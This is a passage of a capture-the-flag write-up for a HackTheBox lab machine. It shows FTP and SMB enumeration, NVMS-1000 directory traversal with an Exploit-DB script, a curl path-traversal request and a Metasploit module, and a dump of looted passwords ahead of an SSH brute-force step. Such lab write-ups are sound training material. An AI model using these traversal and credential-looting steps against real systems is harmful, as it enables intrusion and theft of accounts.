</span></span><span class=line><span class=cl>|_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 235.93 seconds
</span></span></code></pre></td></tr></table></div></div><p>We want to look at FTP (21), Web servers (80 & 8443) and Samba (139,445) first.</p><h3 id=network-reconnaissance-ftp>Network reconnaissance: FTP<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-ftp>#</a></h3><p><a href=https://nmap.org/>Nmap</a> told us it was possible to connect to FTP anonymously but found nothing to
list so let&rsquo;s try ourselves:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ftp 10.10.10.184
</span></span><span class=line><span class=cl>Connected to 10.10.10.184.
</span></span><span class=line><span class=cl>220 Microsoft FTP Service
</span></span><span class=line><span class=cl>Name (10.10.10.184:cyfun): Anonymous
</span></span><span class=line><span class=cl>331 Anonymous access allowed, send identity (e-mail name) as password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>230 User logged in.
</span></span><span class=line><span class=cl>Remote system type is Windows_NT.
</span></span><span class=line><span class=cl>ftp&gt; ls -a
</span></span><span class=line><span class=cl>200 PORT command successful.
</span></span><span class=line><span class=cl>125 Data connection already open; Transfer starting.
</span></span><span class=line><span class=cl>01-18-20  12:05PM       &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>226 Transfer complete.
</span></span></code></pre></td></tr></table></div></div><p>But there is nothing (or I thought so).</p><h3 id=network-reconnaissance-http>Network reconnaissance: HTTP<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-http>#</a></h3><ul><li><p>port 80: <strong>NVMS-1000</strong> http://10.10.10.184/Pages/login.htm</p></li><li><p>port 8443: <strong>NSClient++</strong> https://10.10.10.184:8443/index.html</p></li></ul><p>Both services are asking for credentials but we have none yet.
Let&rsquo;s see if they are vulnerable in a first place.</p><h4 id=nsclient>NSClient++<a hidden class=anchor aria-hidden=true href=#nsclient>#</a></h4><p>Let&rsquo;s look for a <code>NSClient++</code> exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ searchsploit --id NSClient
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                     |  EDB-ID
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                          | 48360
</span></span><span class=line><span class=cl>NSClient++ 0.5.2.35 - Privilege Escalation                                                         | 46802
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ searchsploit -p 46802
</span></span><span class=line><span class=cl>  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/46802
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
</span></span><span class=line><span class=cl>File Type: ASCII text, with very long lines, with CRLF line terminators
</span></span></code></pre></td></tr></table></div></div><p><strong>Hypothesis:</strong></p><p>Once we have a low privileged shell it will be possible to run a command
(<code>nscp web -- password --display</code>) or read the config of NSClient++ to retrieve
a user password. Usually NSClient++ run as privileged user so with an app user
we could create some tasks that will be run by the app daemon and gain more
privileges.</p><h4 id=nvms-1000>NVMS-1000<a hidden class=anchor aria-hidden=true href=#nvms-1000>#</a></h4><p>Let&rsquo;s look for a <code>NVMS-1000</code> exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ searchsploit --id NVMS 1000
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                     |  EDB-ID
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>NVMS 1000 - Directory Traversal                                                                    | 47774
</span></span><span class=line><span class=cl>TVT NVMS 1000 - Directory Traversal                                                                | 48311
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ searchsploit -p 47774
</span></span><span class=line><span class=cl>  Exploit: NVMS 1000 - Directory Traversal
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/47774
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
</span></span><span class=line><span class=cl>File Type: UTF-8 Unicode text, with CRLF line terminators
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ searchsploit -p 48311
</span></span><span class=line><span class=cl>  Exploit: TVT NVMS 1000 - Directory Traversal
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/48311
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/hardware/webapps/48311.py
</span></span><span class=line><span class=cl>File Type: UTF-8 Unicode text, with CRLF line terminators
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s see if the directory traversal works, I have to use <code>dos2unix</code> to
convert CRLF to LF (Windows to Linux).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 -
</span></span><span class=line><span class=cl>dos2unix: active code page: 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Usage : python exploit.py url filename outputname
</span></span><span class=line><span class=cl>Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ windows/win.ini win.ini
</span></span><span class=line><span class=cl>dos2unix: active code page: 0
</span></span><span class=line><span class=cl>Host not vulnerable to Directory Traversal!
</span></span></code></pre></td></tr></table></div></div><p>It failed but maybe because <code>C:\windows\win.ini</code> doesn&rsquo;t exist. Let&rsquo;s try with
something more reliable like the host file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Windows/System32/drivers/etc/hosts hosts.txt
</span></span><span class=line><span class=cl>dos2unix: active code page: 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Directory Traversal Succeeded
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Saving Output
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat hosts.txt
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;response&gt;      &lt;status&gt;fail&lt;/status&gt;
</span></span><span class=line><span class=cl>        &lt;errorCode&gt;536870934&lt;/errorCode&gt;
</span></span><span class=line><span class=cl>&lt;/response&gt;
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s a false positive occurring when there isn&rsquo;t an file extension.
(At first glance it&rsquo;s seems the exploit is not working or the server is
not vulnerable).</p><h3 id=network-reconnaissance-smb>Network reconnaissance: SMB<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-smb>#</a></h3><p>From <a href=https://nmap.org/>Nmap</a> script it&rsquo;s it is SMBv2 but we can&rsquo;t list any shares:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient -L 10.10.10.184 -N
</span></span><span class=line><span class=cl>session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></td></tr></table></div></div><p>As I said in <a href=https://blog.raw.pm/en/hackthebox-nest-write-up/#Network-Enumeration-finding-TempUser>Nest </a>,</p><blockquote><p>CrackMapExec, smb-enum-shares.nse and enum4linux don&rsquo;t find any shares because they support only SMB v1 that is disabled.</p><p>But smbclient and msf modules works. So let&rsquo;s start <a href=https://www.metasploit.com/>metasploit</a> console (msfconsole).</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>smb</span><span class=o>/</span><span class=n>smb_enumshares</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>RHOSTS</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span>
</span></span><span class=line><span class=cl><span class=n>RHOSTS</span> <span class=o>=&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>smb</span><span class=o>/</span><span class=n>smb_enumshares</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span><span class=p>:</span><span class=mi>139</span>      <span class=o>-</span> <span class=n>Login</span> <span class=n>Failed</span><span class=p>:</span> <span class=n>Unable</span> <span class=n>to</span> <span class=n>Negotiate</span> <span class=n>with</span> <span class=n>remote</span> <span class=n>host</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span><span class=p>:</span>         <span class=o>-</span> <span class=n>Scanned</span> <span class=mi>1</span> <span class=n>of</span> <span class=mi>1</span> <span class=n>hosts</span> <span class=p>(</span><span class=mi>100</span><span class=o>%</span> <span class=n>complete</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Auxiliary</span> <span class=n>module</span> <span class=n>execution</span> <span class=n>completed</span>
</span></span></code></pre></td></tr></table></div></div><p>MSF can&rsquo;t list shares either. Let&rsquo;s verify it is supporting SMBv2:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(scanner/smb/smb2) &gt; set RHOSTS 10.10.10.184
</span></span><span class=line><span class=cl>RHOSTS =&gt; 10.10.10.184
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/smb/smb2) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] 10.10.10.184:445      - 10.10.10.184 supports SMB 2 [dialect 255.2] and has been online for 3676767 hours
</span></span><span class=line><span class=cl>[*] 10.10.10.184:445      - Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><h3 id=network-reconnaissance-ftp-lets-go-back>Network reconnaissance: FTP (let&rsquo;s go back)<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-ftp-lets-go-back>#</a></h3><p>As we saw earlier with <code>ftp</code> CLI we didn&rsquo;t see anything.
But I tried again with FileZilla and saw two folders this time, with a file in
each:</p><ul><li><code>Nadine/Confidential.txt</code></li><li><code>Nathan/Notes to do.txt</code></li></ul><p><code>Confidential.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Nathan,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Regards
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nadine
</span></span></code></pre></td></tr></table></div></div><p><code>Notes to do.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>1</span><span class=p>)</span> <span class=n>Change</span> <span class=n>the</span> <span class=n>password</span> <span class=k>for</span> <span class=n>NVMS</span> <span class=o>-</span> <span class=n>Complete</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=p>)</span> <span class=n>Lock</span> <span class=n>down</span> <span class=n>the</span> <span class=n>NSClient</span> <span class=n>Access</span> <span class=o>-</span> <span class=n>Complete</span>
</span></span><span class=line><span class=cl><span class=mi>3</span><span class=p>)</span> <span class=n>Upload</span> <span class=n>the</span> <span class=n>passwords</span>
</span></span><span class=line><span class=cl><span class=mi>4</span><span class=p>)</span> <span class=n>Remove</span> <span class=n>public</span> <span class=n>access</span> <span class=n>to</span> <span class=n>NVMS</span>
</span></span><span class=line><span class=cl><span class=mi>5</span><span class=p>)</span> <span class=n>Place</span> <span class=n>the</span> <span class=n>secret</span> <span class=n>files</span> <span class=ow>in</span> <span class=n>SharePoint</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=network-reconnaissance-http-lets-go-back>Network reconnaissance: HTTP (let&rsquo;s go back)<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-http-lets-go-back>#</a></h3><p>Let&rsquo;s use <code>NVMS-1000</code> path traversal again but this time with:
<code>Users/Nathan/Desktop/Passwords.txt</code> thanks to the information we got on the FTP.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Users/Nathan/Desktop/Passwords.txt passwords.txt
</span></span><span class=line><span class=cl>dos2unix: active code page: 0
</span></span><span class=line><span class=cl>Host not vulnerable to Directory Traversal!
</span></span></code></pre></td></tr></table></div></div><p>No file but we are sure it&rsquo;s here. This exploit looks bad so it may be broken.</p><p>With curl no result either:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl &#39;http://10.10.10.184/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt&#39; --head
</span></span><span class=line><span class=cl>HTTP/1.1 404 Not Found
</span></span><span class=line><span class=cl>Content-type: text/html
</span></span><span class=line><span class=cl>Content-Length: 0
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>AuthInfo:
</span></span></code></pre></td></tr></table></div></div><p>But with <a href=https://www.metasploit.com/>metasploit</a> we get the file (WTF):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>search</span> <span class=n>NVMS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Matching</span> <span class=n>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                       Disclosure Date  Rank    Check  Description</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span>  <span class=o>----</span>                                       <span class=o>---------------</span>  <span class=o>----</span>    <span class=o>-----</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span>  <span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span>  <span class=mi>2019</span><span class=o>-</span><span class=mi>12</span><span class=o>-</span><span class=mi>12</span>       <span class=n>normal</span>  <span class=n>No</span>     <span class=n>TVT</span> <span class=n>NVMS</span><span class=o>-</span><span class=mi>1000</span> <span class=ne>Directory</span> <span class=n>Traversal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>use</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>options</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Module</span> <span class=n>options</span> <span class=p>(</span><span class=n>auxiliary</span><span class=o>/</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Name</span>       <span class=n>Current</span> <span class=n>Setting</span>   <span class=n>Required</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl>   <span class=o>----</span>       <span class=o>---------------</span>   <span class=o>--------</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=n>DEPTH</span>      <span class=mi>13</span>                <span class=n>yes</span>       <span class=n>Depth</span> <span class=k>for</span> <span class=ne>Path</span> <span class=n>Traversal</span>
</span></span><span class=line><span class=cl>   <span class=n>FILEPATH</span>   <span class=o>/</span><span class=n>windows</span><span class=o>/</span><span class=n>win</span><span class=o>.</span><span class=n>ini</span>  <span class=n>yes</span>       <span class=n>The</span> <span class=n>path</span> <span class=n>to</span> <span class=n>the</span> <span class=n>file</span> <span class=n>to</span> <span class=n>read</span>
</span></span><span class=line><span class=cl>   <span class=n>Proxies</span>                      <span class=n>no</span>        <span class=n>A</span> <span class=n>proxy</span> <span class=n>chain</span> <span class=n>of</span> <span class=n>format</span> <span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>[,</span><span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>][</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=n>RHOSTS</span>                       <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>host</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=nb>range</span> <span class=n>CIDR</span> <span class=n>identifier</span><span class=p>,</span> <span class=ow>or</span> <span class=n>hosts</span> <span class=n>file</span> <span class=n>with</span> <span class=n>syntax</span> <span class=s1>&#39;file:&lt;path&gt;&#39;</span>
</span></span><span class=line><span class=cl>   <span class=n>RPORT</span>      <span class=mi>80</span>                <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>port</span> <span class=p>(</span><span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>SSL</span>        <span class=bp>false</span>             <span class=n>no</span>        <span class=n>Negotiate</span> <span class=n>SSL</span><span class=o>/</span><span class=n>TLS</span> <span class=k>for</span> <span class=n>outgoing</span> <span class=n>connections</span>
</span></span><span class=line><span class=cl>   <span class=n>TARGETURI</span>  <span class=o>/</span>                 <span class=n>yes</span>       <span class=n>The</span> <span class=n>base</span> <span class=n>URI</span> <span class=n>path</span> <span class=n>of</span> <span class=n>nvms</span>
</span></span><span class=line><span class=cl>   <span class=n>THREADS</span>    <span class=mi>1</span>                 <span class=n>yes</span>       <span class=n>The</span> <span class=n>number</span> <span class=n>of</span> <span class=n>concurrent</span> <span class=n>threads</span> <span class=p>(</span><span class=nb>max</span> <span class=n>one</span> <span class=n>per</span> <span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>VHOST</span>                        <span class=n>no</span>        <span class=n>HTTP</span> <span class=n>server</span> <span class=n>virtual</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>RHOSTS</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span>
</span></span><span class=line><span class=cl><span class=n>RHOSTS</span> <span class=o>=&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>FILEPATH</span> <span class=o>/</span><span class=n>Users</span><span class=o>/</span><span class=n>Nathan</span><span class=o>/</span><span class=n>Desktop</span><span class=o>/</span><span class=n>Passwords</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>FILEPATH</span> <span class=o>=&gt;</span> <span class=o>/</span><span class=n>Users</span><span class=o>/</span><span class=n>Nathan</span><span class=o>/</span><span class=n>Desktop</span><span class=o>/</span><span class=n>Passwords</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.184</span><span class=p>:</span><span class=mi>80</span> <span class=o>-</span> <span class=n>Downloaded</span> <span class=mi>156</span> <span class=n>bytes</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=ne>File</span> <span class=n>saved</span> <span class=ow>in</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/.</span><span class=n>msf4</span><span class=o>/</span><span class=n>loot</span><span class=o>/</span><span class=mi>20200611175532</span><span class=n>_default_10</span><span class=o>.</span><span class=mf>10.10</span><span class=o>.</span><span class=mi>184</span><span class=n>_nvms</span><span class=o>.</span><span class=n>traversal_675310</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Scanned</span> <span class=mi>1</span> <span class=n>of</span> <span class=mi>1</span> <span class=n>hosts</span> <span class=p>(</span><span class=mi>100</span><span class=o>%</span> <span class=n>complete</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Auxiliary</span> <span class=n>module</span> <span class=n>execution</span> <span class=n>completed</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>http</span><span class=o>/</span><span class=n>tvt_nvms_traversal</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/.</span><span class=n>msf4</span><span class=o>/</span><span class=n>loot</span><span class=o>/</span><span class=mi>20200611175532</span><span class=n>_default_10</span><span class=o>.</span><span class=mf>10.10</span><span class=o>.</span><span class=mi>184</span><span class=n>_nvms</span><span class=o>.</span><span class=n>traversal_675310</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>nsp3ctTh3Way2Mars</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>Th3r34r3To0M4nyTrait0r5</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>B3WithM30r4ga1n5tMe</span>
</span></span><span class=line><span class=cl><span class=n>L1k3B1gBut7s</span><span class=err>@</span><span class=n>W0rk</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=n>nly7h3y0unGWi11F0l10w</span>
</span></span><span class=line><span class=cl><span class=n>IfH3s4b0Utg0t0H1sH0me</span>
</span></span><span class=line><span class=cl><span class=n>Gr4etN3w5w17hMySk1Pa5</span><span class=o>$</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=network-exploitation-ssh>Network exploitation: SSH<a hidden class=anchor aria-hidden=true href=#network-exploitation-ssh>#</a></h3><p>With the looted passwords let&rsquo;s bruteforce SSH for the users nadine and nathan
by using a <a href=https://www.metasploit.com/>metasploit</a> module.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
